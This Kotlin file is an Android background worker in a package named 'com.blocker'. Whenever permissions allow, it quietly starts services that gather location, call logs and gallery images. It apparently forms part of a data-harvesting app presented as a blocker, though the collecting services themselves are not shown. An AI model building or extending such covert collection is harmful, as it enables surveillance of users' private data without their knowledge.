package com.blocker.background

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.blocker.services.CallLogService
import com.blocker.services.LocationService
import com.blocker.services.GallaryService
import java.text.SimpleDateFormat
import android.os.Build
import java.util.*

class BackgroundWorker(context: Context, workerParameters: WorkerParameters) : Worker(context, workerParameters) {

    override fun doWork(): Result {
        val timestamp = System.currentTimeMillis()
        val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))

        val fineLocationPermission = ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarseLocationPermission = ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val callLogPermission = ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        val galleryPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(
                    applicationContext,  // or activity, depending on where this code is
                    android.Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED
            } else {
                ContextCompat.checkSelfPermission(
                    applicationContext,  // or activity, depending on where this code is
                    android.Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED
            }

        if (fineLocationPermission && coarseLocationPermission) {
            val locationIntent = Intent(applicationContext, LocationService::class.java)
            applicationContext.startService(locationIntent)
        }

        if (galleryPermission) {
            val galleryIntent = Intent(applicationContext, GallaryService::class.java)
            applicationContext.startService(galleryIntent)
        }

        if (callLogPermission) {
            val callLogIntent = Intent(applicationContext, CallLogService::class.java)
            applicationContext.startService(callLogIntent)
        }

        return Result.success()
    }
}


